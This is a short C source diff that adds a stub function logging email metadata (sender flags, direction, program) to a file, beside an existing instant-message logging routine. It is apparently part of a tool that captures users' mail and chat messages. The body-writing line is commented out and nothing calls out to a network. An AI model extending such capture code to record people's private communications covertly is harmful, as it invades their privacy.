@@ -49,6 +49,33 @@ void urldecode(char *src)
 	*dest = 0;
 }
 
+void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming)
+{
+	HANDLE hf;
+	struct MailSerializedMessageHeader additional_header;
+	
+	ZeroMemory(&additional_header, sizeof(additional_header));
+	//additional_header.Size = mail_size;
+	additional_header.Flags |= MAIL_FULL_BODY;
+	if (is_incoming)
+		additional_header.Flags |= MAIL_INCOMING;
+	else
+		additional_header.Flags |= MAIL_OUTGOING;
+	additional_header.Program = program;
+	additional_header.VersionFlags = MAPI_V3_0_PROTO;
+	//additional_header.date.dwHighDateTime = mail_date->dwHighDateTime;
+	//additional_header.date.dwLowDateTime = mail_date->dwLowDateTime;
+
+	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
+	if (hf == INVALID_HANDLE_VALUE)
+		return;
+
+	//Log_WriteFile(hf, body, size);
+
+	Log_CloseFile(hf); 
+	return;
+}
+
 void LogSocialIMMessageA(char *program, char *topic, char *peers, char *author, char *body, struct tm *tstamp) 
 {
 	WCHAR *program_w;
